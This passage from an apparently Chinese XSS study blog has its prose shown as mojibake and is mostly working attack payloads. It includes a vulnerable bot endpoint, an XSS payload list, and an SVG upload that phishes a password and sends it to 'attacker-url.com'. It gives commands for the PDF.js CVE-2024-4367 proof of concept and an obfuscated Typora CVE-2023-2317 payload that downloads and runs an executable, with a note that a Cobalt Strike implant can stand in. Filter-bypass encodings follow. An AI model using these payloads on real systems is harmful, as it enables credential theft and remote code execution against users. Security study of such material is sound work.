punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    <span class="token keyword">const</span> content <span class="token operator">=</span> req<span class="token punctuation">.</span>query<span class="token punctuation">.</span>content <span class="token operator">||</span> <span class="token string">''</span><span class="token punctuation">;</span>    res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">        &lt;div></span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>content<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">&lt;/div>    </span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">async</span> <span class="token keyword">function</span> <span class="token function">visitAsBot</span><span class="token punctuation">(</span><span class="token parameter">content</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">const</span> browser <span class="token operator">=</span> <span class="token keyword">await</span> puppeteer<span class="token punctuation">.</span><span class="token function">launch</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>            <span class="token literal-property property">headless</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>            <span class="token literal-property property">args</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token string">'--no-sandbox'</span><span class="token punctuation">,</span> <span class="token string">'--disable-setuid-sandbox'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">const</span> page <span class="token operator">=</span> <span class="token keyword">await</span> browser<span class="token punctuation">.</span><span class="token function">newPage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">await</span> page<span class="token punctuation">.</span><span class="token function">setCookie</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>            <span class="token literal-property property">name</span><span class="token operator">:</span> <span class="token string">'flag'</span><span class="token punctuation">,</span>            <span class="token literal-property property">value</span><span class="token operator">:</span> <span class="token constant">FLAG</span><span class="token punctuation">,</span>            <span class="token literal-property property">domain</span><span class="token operator">:</span> <span class="token string">'localhost'</span><span class="token punctuation">,</span>            <span class="token literal-property property">path</span><span class="token operator">:</span> <span class="token string">'/'</span><span class="token punctuation">,</span>            <span class="token literal-property property">httpOnly</span><span class="token operator">:</span> <span class="token boolean">false</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">await</span> page<span class="token punctuation">.</span><span class="token function">goto</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">http://localhost:3000/botview?content=</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span><span class="token function">encodeURIComponent</span><span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token literal-property property">waitUntil</span><span class="token operator">:</span> <span class="token string">'networkidle2'</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">await</span> <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">3000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">await</span> browser<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span>err<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å¯åŠ¨æ— å¤´ nosandbox çš„ chrome æµè§ˆå™¨ï¼Œæ–°å»ºé¡µé¢ï¼Œæ·»åŠ  cookieï¼Œç„¶åè·³è½¬è®¿é—®é¡µé¢</p><hr><h1 id="å¸¸è§payload"><a href="#å¸¸è§payload" class="headerlink" title="å¸¸è§payload"></a>å¸¸è§payload</h1><p>äº‹å®ä¸Šï¼Œä¸åªæœ‰ script æ ‡ç­¾å¯ä»¥æ‰§è¡Œ javascript</p><p><a href="https://github.com/payloadbox/xss-payload-list/tree/master">https://github.com/payloadbox/xss-payload-list/tree/master</a></p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript"><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">window<span class="token punctuation">[</span><span class="token string">'alert'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">)</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span> <span class="token special-attr"><span class="token attr-name">onload</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token value javascript language-javascript"><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span></span><span class="token punctuation">"</span></span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span> <span class="token special-attr"><span class="token attr-name">onerror</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token value javascript language-javascript"><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span></span><span class="token punctuation">"</span></span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>svg</span> <span class="token special-attr"><span class="token attr-name">onload</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token value javascript language-javascript"><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span></span><span class="token punctuation">"</span></span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>svg</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token special-attr"><span class="token attr-name">onfocus</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token value javascript language-javascript"><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span></span><span class="token punctuation">"</span></span></span> <span class="token attr-name">autofocus</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>input</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>iframe</span> <span class="token special-attr"><span class="token attr-name">onload</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token value javascript language-javascript"><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span></span><span class="token punctuation">"</span></span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>iframe</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>iframe</span> <span class="token attr-name">srcdoc</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>&lt;script src='/**/alert(1)//'>&lt;/script><span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>iframe</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h1 id="åå°„å‹-XSS"><a href="#åå°„å‹-XSS" class="headerlink" title="åå°„å‹ XSS"></a>åå°„å‹ XSS</h1><h2 id="404"><a href="#404" class="headerlink" title="404"></a>404</h2><p>å–œæ¬¢é‡å†™ 404 çš„å°æœ‹å‹ä»¬ä½ ä»¬å¥½å•Šï¼Œæˆ‘æ˜¯ xssï¼ˆ</p><p>ç›´æ¥åœ¨ html ä¸Šè¾“å‡ºå¯æ§å†…å®¹æ˜¯å±é™©çš„è®¾è®¡</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">theme_include</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'header'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token delimiter important">?></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>section</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>content wrap<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">></span></span>Page not found<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>Unfortunately, the page <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>code</span><span class="token punctuation">></span></span>/<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">echo</span> <span class="token function">current_url</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token delimiter important">?></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>code</span><span class="token punctuation">></span></span> could not be found. Your best bet is either to try the <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">echo</span> <span class="token function">base_url</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token delimiter important">?></span></span><span class="token punctuation">"</span></span><span class="token punctuation">></span></span>homepage<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span>, try <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>#search<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>searching<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span>, or go and cry in a corner (although I donâ€™t recommend the latter).<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>section</span><span class="token punctuation">></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">theme_include</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'footer'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>errorhandler</span><span class="token punctuation">(</span><span class="token number">404</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">page_not_found</span><span class="token punctuation">(</span>error<span class="token punctuation">)</span><span class="token punctuation">:</span>    path <span class="token operator">=</span> request<span class="token punctuation">.</span>path    <span class="token keyword">return</span> <span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>path<span class="token punctuation">&#125;</span></span><span class="token string"> not found"</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>  res<span class="token punctuation">.</span><span class="token function">status</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">type</span><span class="token punctuation">(</span><span class="token string">'text/plain'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span><span class="token function">decodeURI</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>path<span class="token punctuation">)</span><span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string"> : invalid path</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 404 é¡µé¢</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><hr><h1 id="å­˜å‚¨å‹-XSS"><a href="#å­˜å‚¨å‹-XSS" class="headerlink" title="å­˜å‚¨å‹ XSS"></a>å­˜å‚¨å‹ XSS</h1><p><a href="https://www.freebuf.com/articles/web/261918.html">https://www.freebuf.com/articles/web/261918.html</a></p><h2 id="svg"><a href="#svg" class="headerlink" title="svg"></a>svg</h2><p>å¯èƒ½å‡ºç°åœ¨æ”¯æŒä¸Šä¼  svg å›¾ç‰‡çš„å¤´åƒå¤„</p><p>å¯å°è¯•æ„é€  svg æ–‡ä»¶ï¼Œå¦‚æœèƒ½å¤Ÿè®¿é—®åˆ™ä¼šè§¦å‘ xss</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token prolog">&lt;?xml version="1.0" standalone="no"?></span><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">svg</span> <span class="token name">PUBLIC</span> <span class="token string">"-//W3C//DTD SVG 1.1//EN"</span> <span class="token string">"http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>svg</span> <span class="token attr-name">version</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>1.1<span class="token punctuation">"</span></span> <span class="token attr-name">baseProfile</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>full<span class="token punctuation">"</span></span> <span class="token attr-name">xmlns</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://www.w3.org/2000/svg<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>polygon</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>triangle<span class="token punctuation">"</span></span> <span class="token attr-name">points</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>0,0 0,50 50,0<span class="token punctuation">"</span></span> <span class="token attr-name">fill</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>#009901<span class="token punctuation">"</span></span> <span class="token attr-name">stroke</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>#004400<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text/javascript<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript"><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>svg</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/blog/2025/09/17/XSS-Re-Master/image-20250509084952919.png" alt="image-20250509084952919"></p><p>å¸¦å¤–</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token prolog">&lt;?xml version="1.0" standalone="no"?></span><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">svg</span> <span class="token name">PUBLIC</span> <span class="token string">"-//W3C//DTD SVG 1.1//EN"</span> <span class="token string">"http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>svg</span> <span class="token attr-name">version</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>1.1<span class="token punctuation">"</span></span> <span class="token attr-name">baseProfile</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>full<span class="token punctuation">"</span></span> <span class="token attr-name">xmlns</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://www.w3.org/2000/svg<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>polygon</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>triangle<span class="token punctuation">"</span></span> <span class="token attr-name">points</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>0,0 0,50 50,0<span class="token punctuation">"</span></span> <span class="token attr-name">fill</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>#009900<span class="token punctuation">"</span></span> <span class="token attr-name">stroke</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>#004400<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">                 <span class="token keyword">var</span> passwd <span class="token operator">=</span> <span class="token function">prompt</span><span class="token punctuation">(</span><span class="token string">"Enter your password to continue"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">var</span> xhr <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">XMLHttpRequest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                xhr<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"GET"</span><span class="token punctuation">,</span><span class="token string">"https://attacker-url.com/log.php?password="</span><span class="token operator">+</span><span class="token function">encodeURI</span><span class="token punctuation">(</span>passwd<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                xhr<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        </span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>svg</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h2 id="pdf"><a href="#pdf" class="headerlink" title="pdf"></a>pdf</h2><p>pdf æ”¯æŒåµŒå…¥ javascriptï¼Œé‚£ä¹ˆå°±æœ‰è¯´æ³•äº†</p><h3 id="ç¦æ˜•Foxit-PDFï¼ˆCVE-2023-27363ï¼‰"><a href="#ç¦æ˜•Foxit-PDFï¼ˆCVE-2023-27363ï¼‰" class="headerlink" title="ç¦æ˜•Foxit PDFï¼ˆCVE-2023-27363ï¼‰"></a>ç¦æ˜•Foxit PDFï¼ˆCVE-2023-27363ï¼‰</h3><p>å¼ºç½‘æ¯ S8 Final æ•´äº†ä¸ªç±»ä¼¼çš„ï¼Œä½†æ˜¯è¦æ±‚ä¸€æ­¥åˆ°ä½</p><p><a href="https://github.com/webraybtl/CVE-2023-27363">https://github.com/webraybtl/CVE-2023-27363</a></p><p><a href="https://github.com/CN016/-Foxit-PDF-CVE-2023-27363-">https://github.com/CN016/-Foxit-PDF-CVE-2023-27363-</a></p><p><a href="https://blog.csdn.net/C20220511/article/details/131397568">https://blog.csdn.net/C20220511/article/details/131397568</a></p><hr><h3 id="PDF-jsï¼ˆCVE-2024-4367ï¼‰"><a href="#PDF-jsï¼ˆCVE-2024-4367ï¼‰" class="headerlink" title="PDF.jsï¼ˆCVE-2024-4367ï¼‰"></a>PDF.jsï¼ˆCVE-2024-4367ï¼‰</h3><blockquote><p>å½“ PDF.js é…ç½® isEvalSupported é€‰é¡¹è®¾ç½®ä¸º trueï¼ˆé»˜è®¤å€¼ï¼‰æ—¶ï¼Œä¼šå°†è¾“å…¥ä¼ é€’åˆ°ç‰¹å®šå‡½æ•°</p></blockquote><p>å½±å“ç‰ˆæœ¬ï¼š</p><ul><li>Mozilla PDF.js &lt;4.2.67</li><li>pdfjs - dist (npm) &lt; 4.2.67</li><li>react - pdf (npm) &lt; 7.7.3 ä»¥åŠ 8.0.0 &lt;&#x3D; react - pdf (npm) &lt; 8.0.2</li></ul><p><a href="https://github.com/Zombie-Kaiser/cve-2024-4367-PoC-fixed">https://github.com/Zombie-Kaiser/cve-2024-4367-PoC-fixed</a></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">python3 CVE-2024-4367.py <span class="token string">"alert(1);"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>è®© pdf.js é¢„è§ˆç”Ÿæˆçš„ pdf</p><p><img src="/blog/2025/09/17/XSS-Re-Master/IMG-20250918112439555.png"></p><p>å¦‚æœæœ‰ä½¿ç”¨è¿™äº›ç‰ˆæœ¬ pdf.js çš„å®¢æˆ·ç«¯ï¼Œåˆ™å¯ä»¥è€ƒè™‘ RCE</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">python3 CVE-2024-4367.py <span class="token string">"require('child_process').exec('calc');"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><h2 id="markdownï¼ˆCVE-2023-2317-Typora-RCEï¼‰"><a href="#markdownï¼ˆCVE-2023-2317-Typora-RCEï¼‰" class="headerlink" title="markdownï¼ˆCVE-2023-2317 Typora RCEï¼‰"></a>markdownï¼ˆCVE-2023-2317 Typora RCEï¼‰</h2><p><a href="https://www.freebuf.com/articles/others-articles/376873.html">https://www.freebuf.com/articles/others-articles/376873.html</a></p><p>Typora &lt; 1.6.7</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>embed</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>typora://app/typemark/updater/updater.html?curVersion=a&amp;newVersion=b&amp;releaseNoteLink=c&amp;hideAutoUpdates=false&amp;labels=[%22%22,%22%3Csvg%2Fonload%3Dtop.eval(%60reqnode('child_process').exec('calc')%60)%3E%3C%2Fsvg%3E%22,%22%22,%22%22,%22%22,%22%22]<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>å¯æ¢æˆ cs é©¬</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>embed</span> <span class="token special-attr"><span class="token attr-name">style</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token value css language-css"><span class="token property">height</span><span class="token punctuation">:</span>0<span class="token punctuation">;</span></span><span class="token punctuation">"</span></span></span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>typora://app/typemark/updater/updater.html?curVersion=111&amp;newVersion=222&amp;releaseNoteLink=333&amp;hideAutoUpdates=false&amp;labels=[%22%22,%22%3csvg%2fonload=top.eval(atob('cmVxbm9kZSgnY2hpbGRfcHJvY2VzcycpLmV4ZWMoKHtXaW4zMjogJ2NlcnR1dGlsLmV4ZSAtdXJsY2FjaGUgLXNwbGl0IC1mIGh0dHA6Ly8xOTIuMTY4LjE0Mi4xMjg6ODk5Mi8xMjEyLmV4ZSAxMjEyLmV4ZSAmJiAxMjEyLmV4ZScsIExpbnV4OiAnZ25vbWUtY2FsY3VsYXRvciAtZSAiVHlwb3JhIFJDRSBQb0MiJ30pW25hdmlnYXRvci5wbGF0Zm9ybS5zdWJzdHIoMCw1KV0p'))>&lt;%2fsvg>%22,%22%22,%22%22,%22%22,%22%22]<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><h1 id="å¸¸è§„è¿‡æ»¤"><a href="#å¸¸è§„è¿‡æ»¤" class="headerlink" title="å¸¸è§„è¿‡æ»¤"></a>å¸¸è§„è¿‡æ»¤</h1><p>ç©ºæ ¼æ›¿æ¢ï¼š<code>/**/</code>ï¼Œ<code>%09</code>ï¼ˆtabï¼‰ï¼Œ<code>%0c</code>ï¼ˆæ¢é¡µç¬¦ï¼‰ï¼Œ<code>/</code></p><p>å¤§å°å†™ç»•è¿‡ï¼š<code>&lt;sCRipT&gt;</code></p><p>HTML ç¼–ç ï¼š<code>&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;colon;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;lpar;&amp;#49;&amp;rpar;</code></p><p><code>String.fromCharCode()</code> ï¼šå°† UTF-16 ç¼–ç è½¬æ¢ä¸ºä¸€ä¸ªå­—ç¬¦</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">document<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>String<span class="token punctuation">.</span><span class="token function">fromCharCode</span><span class="token punctuation">(</span><span class="token number">60</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>document<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>String<span class="token punctuation">.</span><span class="token function">fromCharCode</span><span class="token punctuation">(</span><span class="token number">115</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>document<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>String<span class="token punctuation">.</span><span class="token function">fromCharCode</span><span class="token punctuation">(</span><span class="token number">67</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>document<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>String<span class="token punctuation">.</span><span class="token function">fromCharCode</span><span class="token punctuation">(</span><span class="token number">82</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>document<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>String<span class="token punctuation">.</span><span class="token function">fromCharCode</span><span class="token punctuation">(</span><span class="token number">105</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>document<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>String<span class="token punctuation">.</span><span class="token function">fromCharCode</span><span class="token punctuation">(</span><span class="token number">112</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>document<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>String<span class="token punctuation">.</span><span class="token function">fromCharCode</span><span class="token punctuation">(</span><span class="token number">84</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>document<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>String<span class="token punctuation">.</span><span class="token function">fromCharCode</span><span class="token punctuation">(</span><span class="token number">62</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><code>eval()</code>ï¼šå°†ä¼ å…¥çš„å­—ç¬¦ä¸²å½“åš JavaScript ä»£ç è¿›è¡Œæ‰§è¡Œï¼Œæ”¯æŒåå…­è¿›åˆ¶å­—ç¬¦ä¸²</p><pre class="line-numbers language-markup" data-language="markup"><code 